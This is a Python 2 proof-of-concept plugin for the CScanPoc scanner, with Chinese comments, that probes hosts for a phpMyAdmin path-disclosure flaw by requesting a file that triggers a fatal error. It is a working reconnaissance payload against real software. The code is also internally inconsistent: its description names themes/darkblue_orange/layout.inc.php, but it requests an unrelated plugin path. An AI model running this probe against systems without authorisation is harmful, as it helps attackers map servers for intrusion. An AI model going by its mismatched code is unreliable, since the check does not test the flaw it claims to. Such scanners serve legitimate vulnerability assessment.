# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPMyAdmin_0101'  # 平台漏洞编号，留空
    name = 'PHPMyAdmin /themes/darkblue_orange/layout.inc.php 泄漏服务器物理路径'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-10-19'  # 漏洞公布时间
    desc = '''
    PHPMyAdmin 爆路径方法 weburl+phpmyadmin/themes/darkblue_orange/layout.inc.php。
    '''  # 漏洞描述
    ref = 'http://huaidan.org/archives/1642.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0b1a913f-3f5e-4c75-b53c-337109ce824d'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            paths = ['/', '/phpmyadmin/']
            payload = '/source/plugin/myrepeats/table/table_myrepeats.php'
            for path in paths:
                verify_url = self.target + path + payload
                try:
                    req = urllib2.Request(verify_url)
                    content = urllib2.urlopen(req).read()
                except:
                    continue
                if 'getImgPath()' in content and 'Fatal error:' in content and 'on line' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
